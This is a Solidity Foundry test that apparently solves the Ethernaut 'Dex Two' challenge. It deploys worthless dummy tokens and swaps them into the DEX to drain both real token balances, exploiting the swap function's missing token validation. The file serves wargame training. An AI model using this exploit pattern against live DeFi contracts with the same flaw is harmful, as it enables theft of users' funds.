// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {DexTwo, DexTwoFactory, ERC20} from "ethernaut/levels/DexTwoFactory.sol";

contract DexTwoLevel is SetUpLevelTest {
    DexTwo internal dexTwo;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        instanceBalance = 0 ether;
        playerBalance = 0 ether;
        level = address(new DexTwoFactory());
        super.setUp();
        dexTwo = DexTwo(instance);

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        // drain token1
        DummyToken dummyToken1 = new DummyToken();
        ERC20 token1 = ERC20(dexTwo.token1());
        dummyToken1.transfer(address(dexTwo), 100);
        dummyToken1.approve(address(dexTwo), 100);
        dexTwo.swap(address(dummyToken1), address(token1), 100);
        // drain token2
        DummyToken dummyToken2 = new DummyToken();
        ERC20 token2 = ERC20(dexTwo.token2());
        dummyToken2.transfer(address(dexTwo), 100);
        dummyToken2.approve(address(dexTwo), 100);
        dexTwo.swap(address(dummyToken2), address(token2), 100);
        vm.stopPrank();
    }
}

contract DummyToken is ERC20 {
    constructor() ERC20("Dummy", "DT") {
        _mint(msg.sender, 1000);
    }
}
